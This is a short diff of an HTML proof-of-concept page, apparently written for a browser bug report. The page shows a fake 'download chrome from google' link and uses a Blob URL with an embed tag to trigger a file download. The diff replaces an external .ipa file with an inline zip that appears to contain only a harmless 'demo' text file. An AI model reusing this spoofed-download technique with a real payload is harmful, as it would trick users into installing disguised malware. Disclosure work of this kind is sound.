@@ -1,7 +1,7 @@
 <h1>click link to download chrome from google</h1><a href="#" id="poc" onclick="poc()">link</a>
 <script>
     function poc(){
-        var html = '<embed src="https://ybt01.github.io/upload/chrome.ipa">';
+        var html = '<embed src="data:application/zip;base64,UEsDBAoAAAAAABqFyVyk59fkBQAAAAUAAAAIABwAdGVzdC50eHRVVAkAA5PRJ2qT0SdqdXgLAAEE9QEAAAQAAAAAZGVtbwpQSwECHgMKAAAAAAAahclcpOfX5AUAAAAFAAAACAAYAAAAAAAAAAAApIEAAAAAdGVzdC50eHRVVAUAA5PRJ2p1eAsAAQT1AQAABAAAAABQSwUGAAAAAAEAAQBOAAAARwAAAAAA">';
         var blob = new Blob([html], {type: "text/html"});
         var url = URL.createObjectURL(blob);
         window.location.href = url;
